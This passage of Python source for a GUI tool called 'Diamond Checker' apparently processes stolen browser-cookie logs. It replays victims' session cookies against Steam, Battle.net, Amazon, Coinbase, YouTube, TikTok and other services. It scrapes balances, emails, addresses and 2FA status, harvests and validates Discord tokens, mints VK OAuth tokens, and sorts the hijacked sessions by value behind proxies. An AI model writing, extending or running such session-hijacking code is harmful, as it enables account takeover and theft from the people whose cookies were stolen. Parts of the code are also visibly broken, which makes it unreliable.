                data = r.json()
                r = self.conn(obj=session.get, url='https://account.blizzard.com/api/overview', cookies=cookie, settings=settings, headers={})
                account_info = r.json()
                isAuth = account_info['accountSecurityStatus']['authenticatorAttached']
                isSMSprotect = account_info['accountSecurityStatus']['smsProtectAttached']
                email = account_info['accountDetails']['email']
                text = 'Purchases:\n'
                for i in data['purchases']:
                    text += f"{i['productTitle']} == {i['formattedTotal']}\n"
                text += '\nGifts:\n'
                for i in data['giftClaims']:
                    text += f'{i["productTitle"]}\n'
                if len(data['purchases']) >= 1 or len(data['giftClaims']) >= 1:
                    path_to_save = 'Battlenet_full\\WithPurchases'
                else:
                    path_to_save = 'Battlenet_full'
                self.console_add_text.emit(
                    f'Battlenet\n{text}\nAuth - {isAuth}\nSMSprotect - {isSMSprotect}\nemail - {email}\nCookie:{cookie_name}\n{"=" * 50}\n')
                self.save_results(path_to_save, 'Battlenet_full.txt',
                                  f'{text}\nAuth - {isAuth}\nSMSprotect - {isSMSprotect}\nemail - {email}\nCookie:{cookie_name}\n{"=" * 50}\n')
                if settings['settings']['save_battlenet_logs'] == 1:
                    self.save_logs(path_to_save, cookie_name,
                                   f'{text}\nAuth - {isAuth}\nSMSprotect - {isSMSprotect}\nemail - {email}\nCookie:{cookie_name}\n{"=" * 50}\n')
            except Exception as err:
                pass

    def check_steam(self, cookie_name, settings):
        global url_settings
        try:
            cookie = self.net_to_cookie(cookie_name, 'steam')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://store.steampowered.com/account/', cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                inv_url = soup.find_all('a', attrs={'class': 'submenuitem'})[17].get('href')
                profile_url = soup.find('a', attrs={'class': 'user_avatar playerAvatar offline'}).get('href')
                try:
                    balance = soup.find('div', attrs={'class': 'accountData price'}).text
                except Exception as err:
                    balance = 'None'

                try:
                    guard = soup.find('div', attrs={'class': 'account_security_block'}).find_next('div', attrs={
                        'class': 'account_data_field'}).text.replace('							', '').replace('\n',
                                                                                                                 '')
                    guard = u'{0}'.format(guard)
                except Exception as err:
                    guard = 'Information could not be obtained'

                try:
                    mail = soup.find_all('div', attrs={'class': 'account_setting_sub_block'})[3].find_next('span',
                                                                                                           attrs={
                                                                                                               'class': 'account_data_field'}).text
                except Exception as err:
                    mail = '?'

                r = self.conn(obj=session.get, url=inv_url, cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                try:
                    items_all = soup.find('div', attrs={'class': 'games_list_tabs'})
                    games = items_all.find_all_next('span', attrs={'class': 'games_list_tab_name'})
                    items_count = items_all.find_all_next('span', attrs={'class': 'games_list_tab_number'})
                    inventory_text = ''
                    for i in range(len(games)):
                        inventory_text += f'{games[i].text}: {items_count[i].text}\n'
                except Exception as err:
                    items_all = 0
                    games = 0
                    items_count = 0
                    inventory_text = 'Failed to load inventory info'
                try:
                    r = self.conn(obj=session.get, url=f'https://csgobackpack.net/?nick={profile_url}', cookies=cookie, settings=settings, headers={})
                    soup = bs(r.text, 'html.parser')
                    price = soup.find('div', attrs={'class': 'well'}).find_next('p').text
                except:
                    price = '???'
                try:
                    r = self.conn(obj=session.get, url='https://ruststash.com/inventory/{profile_url.split("/")[3]}', cookies=cookie, settings=settings, headers={})
                    soup = bs(r.text, 'html.parser')
                    price_rust = soup.find('div', attrs={'class': 'well'}).find_next('p').text
                except:
                    price_rust = '???'
                self.console_add_text.emit(
                    f'Steam\nPROFILE URL - {profile_url} || BALANCE - {balance}\n\nINVENTORY:\n{inventory_text}\nInventory price\nCS:GO:{price}\nRust:{price_rust}\nMail:{mail}\nGuard:{guard}\nCookie:{cookie_name}\n{"=" * 30}')
                self.save_results('Steam', 'Steam.txt',
                                  f'PROFILE URL - {profile_url} || BALANCE - {balance}\n\nINVENTORY:\n{inventory_text}\nInventory price\nCS:GO:{price}\nRust:{price_rust}\nMail:{mail}\nGuard:{guard}\nCookie:{cookie_name}\n{"=" * 30}')
                if settings['settings']['save_steam_logs'] == 1:
                    self.save_logs('Steam', cookie_name,
                                   f'PROFILE URL - {profile_url} || BALANCE - {balance}\n\nINVENTORY:\n{inventory_text}\nMail:{mail}\nCS:GO inventory price:{price}\nGuard:{guard}\nCookie:{cookie_name}')
            except Exception as err:
#                print(err)
                pass

    def check_youtube(self, cookie_name, settings):
        youtbe_part_one = "['id-0'].resolve("
        try:
            cookie = self.net_to_cookie(cookie_name, 'youtube')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://studio.youtube.com/channel/?approve_browser_access=1', cookies=cookie, settings=settings, headers={})
                if '<div class="yt-dialog hid " id="create-channel-identity-lb">' not in r.text:
                    html = r.text.split(youtbe_part_one)[1]
                    html = html.split(');')[0]
                    data = json.loads(html)
                    url = f"https://www.youtube.com/channel/{data['channelId']}"
                    subscribers = data['metric'][f"subscriberCount"]
                    totalVideoViewCount = data['metric']['totalVideoViewCount']
                    isNameVerified = data['isNameVerified']
                    isMonetized = data['isMonetized']
                    channel_name = data['title']
                    if settings['filters']['youtube_min_subs'] <= int(subscribers) <= settings['filters'][
                        'youtube_max_subs']:
                        self.console_add_text.emit(
                            f"Channel URL - {url}\nChannel_name - {channel_name}\nMonetized - {isMonetized}\nVerified - {isNameVerified}\nTotalVideoViews - {totalVideoViewCount}\nSubs - {subscribers}\nCookie:{cookie_name}\n{'=' * 30}")
                        now = DT.datetime.now(DT.timezone.utc).astimezone()
                        time_format = '%H:%M:%S'
                        if not os.path.exists('Youtube'):
                            os.mkdir('Youtube')
                        else:
                            if int(subscribers) >= int(settings['save_filters']['yt_min_subs']):
                                if isMonetized == True:
                                    path_to_save = 'Youtube\\Monetized'
                                else:
                                    path_to_save = f"Youtube\\Youtube_{settings['save_filters']['yt_min_subs']}+"
                                self.save_results(path_to_save,
                                                  f"{subscribers}подписчиков_{now:{time_format.replace(':', '-')}}.txt",
                                                  f"Channel URL - {url}\n Channel_name - {channel_name}\nMonetized - {isMonetized}\nVerified - {isNameVerified}\nTotalVideoViews - {totalVideoViewCount}\nSubs - {subscribers}\nCookie:{cookie_name}")
                                self.save_logs(path_to_save, cookie_name,
                                               f"Channel_name - {channel_name}\nMonetized - {isMonetized}\nVerified - {isNameVerified}\nTotalVideoViews - {totalVideoViewCount}\nSubs - {subscribers}\nCookie:{cookie_name}")
                            else:
                                path_to_save = 'Youtube'
                            if isMonetized == True:
                                path_to_save = 'Youtube\\Monetized'
                            else:
                                path_to_save = 'Youtube'
                        self.save_results(path_to_save,
                                          f"{subscribers}subscribers_{now:{time_format.replace(':', '-')}}.txt",
                                          f"Channel_name - {channel_name}\nMonetized - {isMonetized}\nVerified - {isNameVerified}\nTotalVideoViews - {totalVideoViewCount}\nSubs - {subscribers}\nCookie:{cookie_name}")
                        if settings['settings']['save_yt_logs'] == 1:
                            self.save_logs(path_to_save, cookie_name,
                                           f"Channel_name - {channel_name}\nMonetized - {isMonetized}\nVerified - {isNameVerified}\nTotalVideoViews - {totalVideoViewCount}\nSubs - {subscribers}\nCookie:{cookie_name}")
                        if settings['settings']['save_yt_cookies'] == 1:
                            self.save_cookies_yt('YT_Cookies', cookie_name, channel_name, subscribers)
                else:
                    self.console_add_text.emit('Found YT cookie without channel')
                    self.save_cookies_yt('Yt_Cookies_NoChannel', cookie_name, 'No channel', '-')
            except Exception as err:
                try:
                    pass
                finally:
                    err = None
                    del err

    def check_kryptex(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'kryptex')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://www.kryptex.org/site/dashboard', cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                balance = soup.find('h3', attrs={'class': 'h1 line-normal mb-0'}).text
                self.console_add_text.emit(f"Kryptex account: Total balance: {balance}")
                text_to_insert = f"Total balance: {balance}\nCookie:{cookie_name}"
                self.save_results('Kryptex', f"{balance}_{random.randint(1, 100000)}.txt", text_to_insert)
                if settings['settings']['save_kryptex_logs'] == 1:
                    self.save_logs('Kryptex', cookie_name, text_to_insert)
            except Exception as err:
                try:
                    pass
                finally:
                    self.err = None
                    del self.err

    def check_tiktok(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'tiktok')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://www.tiktok.com/404?fromUrl=/me', cookies=cookie, settings=settings, headers={})
                id = r.text.split('"uniqueId":"')[1].split('"')[0]
                r = self.conn(obj=session.get, url=f"https://www.tiktok.com/@{id}", cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                following = soup.find('strong', attrs={'data-e2e': 'following-count'}).text
                followers = soup.find('strong', attrs={'data-e2e': 'followers-count'}).text
                likes = soup.find('strong', attrs={'data-e2e': 'likes-count'}).text
                if int(followers) > int(settings['save_filters']['tiktok_min_subs']):
                    path_to_save = f"TikTok\\TikTok_{settings['save_filters']['tiktok_min_subs']}+"
                    self.save_results(path_to_save, 'TikTok.txt',
                                      f"Followers:{followers}\nLikes:{likes}\nCookie:{cookie_name}\n")
                else:
                    path_to_save = 'TikTok'
                    self.save_results('TikTok', f"{followers} followers_{id}.txt",
                                      f"Followers:{followers}\nLikes:{likes}\nCookie:{cookie_name}\n")
                if settings['settings']['save_tiktok_logs'] == 1:
                    self.save_logs(path_to_save, cookie_name,
                                   f"Followers:{followers}\nLikes:{likes}\nCookie:{cookie_name}\n")
            except Exception as err:
                try:
                    pass
                finally:
                    self.err = None
                    del self.err

    def check_pathofexile(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'pathofexile')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                characters = ''
                r = self.conn(obj=session.get, url='https://ru.pathofexile.com/character-window/get-characters', cookies=cookie, settings=settings, headers={})
                data = r.json()
                for i in data:
                    characters += f"{i['name']} | league:{i['league']} | level:{i['level']}\n"

                r = self.conn(obj=session.get, url='https://ru.pathofexile.com/my-account', cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                money = soup.find('span', attrs={'class': 'amount shopCurrentCoinValue account'}).text
                account_name = r.text.split('var a = new A({"name":"')[1].split('"')[0]
                r = self.conn(obj=session.get, url=f"https://ru.pathofexile.com/character-window/get-stash-items?accountName={account_name}&realm=pc&league=Heist&tabs=1&tabIndex=0", cookies=cookie, settings=settings, headers={})
                tabs_count = r.json()['numTabs']
                self.console_add_text.emit('Path Of Exile account!')
                text_to_insert = f"{'=============================='}\n\nBalance: {money}\nThe number of tabs in the inventory: {tabs_count}\nCharacters:\n{characters}\nCookie:{cookie_name}\n{'=============================='}\n\n"
                self.save_results('PathOfExile', 'Poe_info.txt', text_to_insert)
                if settings['settings']['save_pathofexile_logs'] == 1:
                    self.save_logs('PathOfExile', cookie_name,
                                   f"{'=============================='}\n\nBalance: {money}\nThe number of tabs in the inventory: {tabs_count}\nCharacters:\n{characters}\nCookie:{cookie_name}\n{'=============================='}\n\n")
            except:
                pass

    def check_hitbtc(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'hitbtc')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                header = {'x-csrf-token': cookie['csrf']}
                r = self.conn(obj=session.get, url='https://hitbtc.com/sub-accounts/transfer-emails-list', cookies=cookie, settings=settings, headers={})
                data = r.json()
                email = data['data'][0]['email']
                self.save_results('HitBTC', 'HitBTC.txt', f"Valid session with mail {email}\nCookie:{cookie_name}\n")
                if settings['settings']['save_hitbtc_logs'] == 1:
                    self.save_logs('HitBTC', cookie_name, f"Valid session with mail {email}\nCookie:{cookie_name}\n")
                self.console_add_text.emit('found HIT BTC!')
            except:
                pass

    def check_amazon(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'amazon')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                domains = ["ca", "com.br", "com", "de", "sg", "ae", "com.tr", "in", "com.au", "co.uk", "cn", "fr", "it",
                           "co.jp", "pl", "es", "nl"]
                for domain in domains:
                    session = requests.Session()
                    r = self.conn(obj=session.get, url=f'https://www.amazon.{domain}/ref=nav_logo', cookies=cookie, settings=settings, headers={})
                    soup = bs(r.text, 'html.parser')
                    pattern = re.compile(r"'config.customerName','(.*?)'\);", re.MULTILINE | re.DOTALL)
                    script = soup.find("script", text=pattern)
                    if script != None:
                        account_name = pattern.search(script.text).group(1)
                        account_address = soup.find('span', attrs={'class': 'nav-line-2 nav-progressive-content'}).text
                        try:
                            account_date = soup.find('p', attrs={'class': 'a-size-base truncate-1line'}).text
                        except:
                            account_date = "NONE"
                        self.console_add_text.emit(account_address)
                        self.save_results('Amazon', 'Amazon.txt',
                                          f'Domain: {r.url}\nCookie: {cookie_name}\nAccount name: {account_name}\nAccount address: {account_address}Account date create: {account_date}\n{"=" * 100}\n')
                        if settings['settings']['save_amazon_logs'] == 1:
                            shutil.copytree(self.get_path(cookie_name),
                                            "Amazon"+"\\"+domain+"\\"+self.get_path(cookie_name).split("\\")[1])
                            self.save_results("Amazon"+"\\"+domain+"\\"+self.get_path(cookie_name).split("\\")[1], 'Amazon_checked_info.txt', f'Domain: https://www.amazon.{domain}\nCookie: {cookie_name}\nAccount name: {account_name}\nAccount address: {account_address}Account date create: {account_date}\n{"=" * 100}\n')
                    else:
                        script = 'poshel nahyi oshibka ebanaya ebalo y tebya none'
            except:
                pass

    def check_coinbase(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'coinbase')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://www.coinbase.com/api/v2/hold-balances', cookies=cookie, settings=settings, headers={})
                data = json.loads(r.text)
                balance = f"{data['data']['total_portfolio_balance']['amount']}{data['data']['total_portfolio_balance']['currency']}"
                self.save_results('Coinbase', 'Coinbase.txt', f'Balance: {balance}\nCookie:{cookie_name}')
                if settings['settings']['save_coinbase_logs'] == 1:
                    shutil.copytree(self.self.get_path(cookie_name),
                                    f'Coinbase\\{self.get_path(cookie_name).replace("data", "")}')
                    self.save_results(f'Coinbase\\{self.get_path(cookie_name).replace("data", "")}',
                                      'Coinbase_checked_info.txt',
                                      f'Balance: {balance}\nCookie:{cookie_name}')
            except Exception as err:
                pass

    def check_humble(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'humblebundle')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://www.humblebundle.com/user/wallet?hmb_source=navbar', cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                balance = soup.find('div', attrs={'class': 'balance'}).text
                self.save_results('Humble', 'Humblebundle.txt', f'Cookie:{cookie_name}{balance}{"=" * 40}')
                if settings['settings']['save_humble_logs'] == 1:
                    shutil.copytree(self.get_path(cookie_name),
                                    f'Humble\\{self.get_path(cookie_name).replace("data", "")}')
                    self.save_results(f'Humble\\{self.get_path(cookie_name).replace("data", "")}',
                                      'Humble_checked_info.txt',
                                      f'Cookie:{cookie_name}{balance}')
            except:
                pass

    def check_free_bitcoin(self, cookie_name, settings):
        try:
            cookie = self.net_to_cookie(cookie_name, 'freebitco.in')
        except:
            cookie = {}
        if len(cookie) > 1:
            try:
                session = requests.Session()
                r = self.conn(obj=session.get, url='https://freebitco.in/', cookies=cookie, settings=settings, headers={})
                soup = bs(r.text, 'html.parser')
                balance = soup.find('span', attrs={'id': 'balance'}).text
                self.console_add_text.emit(f'Balance: {balance} BTC \nCookie:{cookie_name}')
                if not os.path.exists('Freebtc'):
                    os.mkdir('Freebtc')
                if float(balance) > float(settings['save_filters']['freebtc_min_balance']):
                    path_to_save = f"Freebtc\\Freebtc_{settings['save_filters']['freebtc_min_balance']}+"
                    self.save_results(path_to_save, 'freebitcoin.txt', f'Balance: {balance}\nCookie:{cookie_name}')
                else:
                    path_to_save = 'Freebtc'
                self.save_results(path_to_save, 'freebitcoin.txt', f'Balance: {balance}\nCookie:{cookie_name}')
                if settings['settings']['save_freebtc_logs'] == 1:
                    self.save_logs(path_to_save, cookie_name, 'Balance: {balance}\nCookie:{cookie_name}')
            except:
                pass

    def get_vk_token(self, cookie, settings):
        try:
            session = requests.Session()
            url = 'https://oauth.vk.com/authorize?client_id=6121396&scope=501202911&redirect_uri=https://oauth.vk.com/blank.html&display=page&response_type=token&revoke=1'
            r = self.conn(obj=session.get, url=url, cookies=cookie, settings=settings, headers={})
            soup = bs(r.text, 'html.parser')
            pattern = re.compile(r'location.href = "(.*?)"\+addr;', re.MULTILINE | re.DOTALL)
            script = soup.find("script", text=pattern)
            link = pattern.search(script.text).group(1)
            r = self.conn(obj=session.get, url=link, cookies=cookie, settings=settings, headers={})
            soups = bs(r.text, 'html.parser')
            pattern = re.compile(r"location.href='(.*?)';", re.MULTILINE | re.DOTALL)
            script = soups.find("script", text=pattern)
            access_token = pattern.search(script.text).group(1)
            token = access_token.split('token=')[1]
            token = token.split('&')[0]
            self.save_results(folder_name='VK_tokens', file_name='tokens.txt', text_to_insert=f'{token}')
        except Exception as err:
#            self.console_add_text.emit("Mistake vk_token:" + self.err)
            pass

    def get_user_info(self, token, settings):
        try:
            idlist = []
            session = requests.Session()
            url = "https://discordapp.com/api/v7/users/@me?verified"
            headers = {"authorization": token}
            r = self.conn(obj=session.get, url=url, cookies=None, settings=settings, headers=headers)
            if r.status_code == 200:
                json_response = r.json()
                if json_response["id"] not in idlist:
                    idlist.append(json_response["id"])
                    if json_response["verified"] == True:
                        return True
                    else:
                        return False
                else:
                    return "sameToken"
            else:
                return None
        except Exception as err:
            print(err)
            #            self.console_add_text.emit("Mistake vk_token:" + self.err)
            pass

    def get_plan_id(self, token, settings):
        try:
            session = requests.Session()
            for json in self.conn(obj=session.get, url="https://discord.com/api/v7/users/@me/billing/subscriptions", cookies=None, settings=settings, headers={"authorization": token}).json():
                try:
                    if json["plan_id"] == "511651880837840896":
                        return True
                    else:
                        return False
                except:
                    return None
        except Exception as err:
            print(err)
            #            self.console_add_text.emit("Mistake vk_token:" + self.err)
            pass

    def get_payment_id(self, token, settings):
        try:
            session = requests.Session()
            for json in self.conn(obj=session.get, url="https://discordapp.com/api/v7/users/@me/billing/payment-sources",  cookies=None, settings=settings, headers={"authorization": token}).json():
                try:
                    if json["invalid"] == True:
                        return True
                    else:
                        return False
                except:
                    return None
        except Exception as err:
            print(err)
            #            self.console_add_text.emit("Mistake vk_token:" + self.err)
            pass

    def check_discord(self, cookie_name, settings):
        try:
            if not os.path.exists("Discord"):
                os.makedirs("Discord")

            dirValidTokens = f"Discord/valid.txt"
            dirUnverifiedTokens = f"Discord/unverified.txt"
            dirSameTokens = f"Discord/sameTokens.txt"
            dirInvalidTokens = f"Discord/invalid.txt"
            dirNitroTokens = f"Discord/nitro.txt"
            tokens = []

            for line in [x.strip() for x in open(f"{cookie_name}", errors="ignore").readlines() if
                         x.strip()]:  # cookie_name this is a file that it devours and runs for tokens
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in re.findall(regex, line):
                        tokens.append(token)

            tokens = list(dict.fromkeys(tokens))
            for token in tokens:
                user_info = self.get_user_info(token, settings)
                if user_info == "sameToken":
                    with open(dirSameTokens, "a", encoding="utf-8") as f:
                        f.write(token + "\n")

                else:
                    if user_info == None:
                        with open(dirInvalidTokens, "a", encoding="utf-8") as f:
                            f.write(token + "\n")
                    elif user_info == True:
                        with open(dirValidTokens, "a", encoding="utf-8") as f:
                            f.write(token + "\n")
                        planid = self.get_plan_id(token, settings)
                        payid = self.get_payment_id(token, settings)
                        if planid != None or payid != None:
                            with open(dirNitroTokens, "a", encoding="utf-8") as f:
                                f.write(token + "\n")
                            self.console_add_text.emit(f"{token}   |  Nitro")
                        else:
                            self.console_add_text.emit(f"{token}   |  Valid")
                    else:
                        with open(dirUnverifiedTokens, "a", encoding="utf-8") as f:
                            f.write(token + "\n")
                        self.console_add_text.emit(f"{token}   |  Unverified")
        except Exception as err:
            print(err)
            #            self.console_add_text.emit("Mistake vk_token:" + self.err)
            pass

    def check_genshin(self, cookie_name, settings):
          try:
              cookie = self.net_to_cookie(cookie_name, 'mihoyo')
          except:
              cookie = {}
          if len(cookie) > 1:
              try:
                  r = self.conn(requests.post, url='https://api-os-takumi.mihoyo.com/community/user/wapi/userInfoEdit', settings=settings, headers={}, cookies=cookie, data='{"avatar":"100108","avatar_url":"","gender":0,"introduce":""}')
                  jj = r.json()['message']
                  if jj == 'OK':
                      print('Working, message from server: {}'.format(jj))
              except Exception as err:
                  print(err)
                  pass
     



    def run(self):
        settings = Config().settings_reader()
        global all_cooks

        all_cooks = self.files_reader(settings['settings']['dir_logs'])

        if settings['settings']['PROXY'] != "off":
            self.get_proxies_from_file(settings)
        else:
            self.console_add_text.emit(f'Proxies are disabled\n')
        global useragents
        useragents = self.select_useragent_mode(settings)

        THR = settings['settings']['THR']
        threads = len(all_cooks) // THR
        start = 0
        end = threads

        for i in range(0, THR):
            threading.Thread(target=self.check_all, args=(all_cooks, start, end, settings)).start()
            if i != THR - 1:
                start += threads
                end += threads
        threading.Thread(target=self.check_all, args=(all_cooks, end, len(all_cooks), settings)).start()


class MainWindowChecker(QtWidgets.QMainWindow):
    def __init__(self):
        super(MainWindowChecker, self).__init__()
        self.checking = CheckThread()
        self.ui = main_ui.Ui_MainWindow()
        self.ui.setupUi(self)
        self.init_UI()
        self.checking.console_add_text.connect(self.console)
        self.checking.info_progress.connect(self.info_r)
        self.checking.progres_setup.connect(self.progres_set)
        
    def info_r(self, info):
        # Handle the info received
        if info.service_name in self.cookie_counts:
            self.cookie_counts[info.service_name] += info.cookie_count
        else:
            self.cookie_counts[info.service_name] = info.cookie_count

        # Perform additional operations based on the received info
        print("Received info:", info)
        print("Cookie counts:", self.cookie_counts)

    def init_UI(self):

        settings = Config().settings_reader()

        self.setWindowTitle('💎 Diamond Checker - Opensourced.Pro')
        self.setWindowIcon(QIcon('diamond.ico'))

        self.ui.spinBox_thr.setValue(settings['settings']['THR'])

        self.ui.checkBox_ua.setCheckState(settings['settings']['USERAGENT'])
        self.ui.checkBox_steam.setCheckState(settings['services']['STEAM'])
        self.ui.checkBox_instagram.setCheckState(settings['services']['INSTAGRAM'])
        self.ui.checkBox_funpay.setCheckState(settings['services']['FUNPAY'])
        self.ui.checkBox_netflix.setCheckState(settings['services']['NETFLIX'])
        self.ui.checkBox_roblox.setCheckState(settings['services']['ROBLOX'])
        self.ui.checkBox_freebitcoin.setCheckState(settings['services']['FREEBITCOIN'])
        self.ui.checkBox_battlenet.setCheckState(settings['services']['BATTLE'])
        self.ui.checkBox_amazon.setCheckState(settings['services']['AMAZON'])
        self.ui.checkBox_humble.setCheckState(settings['services']['HUMBLE'])
        self.ui.checkBox_kryptex.setCheckState(settings['services']['KRYPTEX'])
        self.ui.checkBox_coinbase.setCheckState(settings['services']['COINBASE'])
        self.ui.checkBox_pathofexile.setCheckState(settings['services']['PATHOFEXILE'])
        self.ui.checkBox_hitbtc.setCheckState(settings['services']['HITBTC'])
        self.ui.checkBox_tiktok.setCheckState(settings['services']['TIKTOK'])
        self.ui.checkBox_youtube.setCheckState(settings['services']['YT'])
        self.ui.checkBox_discord.setCheckState(settings['services']['DISCORD'])
        self.ui.checkBox_vk.setCheckState(settings['services']['VK'])
        self.ui.facebookads__checkbox.setCheckState(settings['services']['FACEBOOK'])
        self.ui.snapchat_ads_checkbox.setCheckState(settings['services']['SNAPCHATADS'])
        self.ui.tinder_ads_checkbox.setCheckState(settings['services']['TINDERADS'])
        self.ui.twitter_ads_checkbox.setCheckState(settings['services']['TWITTERADS'])
        self.ui.craigslist_ads_checkbox.setCheckState(settings['services']['CRAIGSLISTADS'])
        self.ui.airbnb_checkbox.setCheckState(settings['services']['AIRBNB'])
        self.ui.microsoft_ads_checkbox.setCheckState(settings['services']['MICROSOFTADS'])
        self.ui.walmart_checkbox.setCheckState(settings['services']['WALMART'])
        self.ui.uber_eats_checkbox.setCheckState(settings['services']['UBEREATS'])
        self.ui.zillow_checkbox.setCheckState(settings['services']['ZILLOW'])
        self.ui.flipkart_checkbox.setCheckState(settings['services']['FLIPKART'])
        self.ui.dh_gate_checkbox.setCheckState(settings['services']['DHGATE'])
        self.ui.instacart_checkbox.setCheckState(settings['services']['INSTACART'])
        self.ui.ashley_madison_checkbox.setCheckState(settings['services']['ASHLEYMADISON'])
        self.ui.zoosk_checkbox.setCheckState(settings['services']['ZOOSK'])
        self.ui.christan_mingle_checkbox.setCheckState(settings['services']['CHRISTANMINGLE'])
        self.ui.vinted_checkbox.setCheckState(settings['services']['VINTED'])
        self.ui.booking_checkbox.setCheckState(settings['services']['BOOKING'])
        self.ui.temu_checkbox.setCheckState(settings['services']['TEMU'])
        self.ui.kick_checkbox.setCheckState(settings['services']['KICK'])
        self.ui.myspace_checkbox.setCheckState(settings['services']['MYSPACE'])
        self.ui.snapchat_ads_checkbox.setCheckState(settings['services']['SNAPCHAT'])
        self.ui.twitch_checkbox.setCheckState(settings['services']['TWITCH'])
        self.ui.localsapp_checkbox.setCheckState(settings['services']['LOCALS'])
        self.ui.linkedin_checkbox.setCheckState(settings['services']['LINKEDIN'])
        self.ui.progressBar.setValue(0)
        self.ui.comboBox_proxy.activated.connect(self.proxy_select)
        self.ui.lineEdit_dir.setText(settings['settings']['dir_logs'])
        self.ui.lineEdit_proxy.setText(settings['settings']['proxies_file'])
        self.ui.lineEdit_ua.setText(settings['settings']['useragents_file'])
        self.ui.pushButton.clicked.connect(self.check)

    def select_directory(self):
        directory = QFileDialog.getExistingDirectory(self, 'Select Directory')
        if directory:
            self.crawl_directory(directory)

    def crawl_directory(self, directory):
        cookies_count = 0
        files_with_cookies = []

        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if self.contains_cookies(file_path):
                    cookies_count += 1
                    files_with_cookies.append(file_path)

        self.textEdit_console.clear()
        self.textEdit_console.append('Files with Cookies:')
        for file_path in files_with_cookies:
            self.textEdit_console.append(file_path)

        self.number_of_label.setText(f'Number of Cookies: {cookies_count}')
    def contains_cookies(file_path):
        with open(file_path, 'r') as file:
            content = file.read()
    
        # Define a regular expression pattern to match cookies
        cookie_pattern = r'(?i)\bcookie\b'
    
        # Use the re.search() function to search for the pattern in the file content
        if re.search(cookie_pattern, content):
            return True
        else:
            return False


    def proxy_select(self, index):
        settings = Config().settings_reader()
        settings['settings']['PROXY'] = self.ui.comboBox_proxy.itemText(index)
        Config().settings_write(settings)

    @staticmethod
    def contains_cookies(file_path):
        def search_cookies_in_line(line):
            # Define a regular expression pattern to match cookies
            cookie_pattern = r'(?i)\bcookie\b'
    
            # Use the re.search() function to search for the pattern in the line
            if re.search(cookie_pattern, line):
                return True
    
            return False
    
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                if search_cookies_in_line(line):
                    return True
    
        return False

    def count_cookies_in_directory(self, directory):
        cookies_count = 0

        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if self.contains_cookies(file_path):
                    cookies_count += 1

        return cookies_count


    def dir_logs(self):
        options = QFileDialog.Options()
        folderName = QFileDialog.getExistingDirectory(self, "Directory Dialog", "", options=options)
        if folderName:
            settings = Config().settings_reader()
            settings['settings']['dir_logs'] = folderName
            Config().settings_write(settings)
            self.ui.lineEdit_dir.setText(settings['settings']['dir_logs'])

            cookies_count = self.count_cookies_in_directory(folderName)
            print(f"Total number of cookies: {cookies_count}")

    def proxies_file(self):
        options = QFileDialog.Options()
        fileName = QFileDialog.getOpenFileName(self, "QFileDialog.getOpenFileName()", "", "*.txt", options=options)
        if fileName:
            settings = Config().settings_reader()
            settings['settings']['proxies_file'] = fileName[0]
            Config().settings_write(settings)
            self.ui.lineEdit_proxy.setText(settings['settings']['proxies_file'])

    def useragents_file(self):
        options = QFileDialog.Options()
        fileName = QFileDialog.getOpenFileName(self, "QFileDialog.getOpenFileName()", "", "*.txt", options=options)
        if fileName:
            settings = Config().settings_reader()
            settings['settings']['useragents_file'] = fileName[0]
            Config().settings_write(settings)
            self.ui.lineEdit_ua.setText(settings['settings']['useragents_file'])

    def check(self):
        settings = Config().settings_reader()
        settings['settings']['THR'] = int(self.ui.spinBox_thr.text())
        settings['settings']['USERAGENT'] = int(self.ui.checkBox_ua.checkState())
        settings['services']['STEAM'] = int(self.ui.checkBox_steam.checkState())
        settings['services']['INSTAGRAM'] = int(self.ui.checkBox_instagram.checkState())
        settings['services']['FUNPAY'] = int(self.ui.checkBox_funpay.checkState())
        settings['services']['NETFLIX'] = int(self.ui.checkBox_netflix.checkState())
        settings['services']['ROBLOX'] = int(self.ui.checkBox_roblox.checkState())
        settings['services']['FREEBITCOIN'] = int(self.ui.checkBox_freebitcoin.checkState())
        settings['services']['BATTLE'] = int(self.ui.checkBox_battlenet.checkState())
        settings['services']['AMAZON'] = int(self.ui.checkBox_amazon.checkState())
        settings['services']['HUMBLE'] = int(self.ui.checkBox_humble.checkState())
        settings['services']['KRYPTEX'] = int(self.ui.checkBox_kryptex.checkState())
        settings['services']['COINBASE'] = int(self.ui.checkBox_coinbase.checkState())
        settings['services']['PATHOFEXILE'] = int(self.ui.checkBox_pathofexile.checkState())
        settings['services']['HITBTC'] = int(self.ui.checkBox_hitbtc.checkState())
        settings['services']['TIKTOK'] = int(self.ui.checkBox_tiktok.checkState())
        settings['services']['YT'] = int(self.ui.checkBox_youtube.checkState())
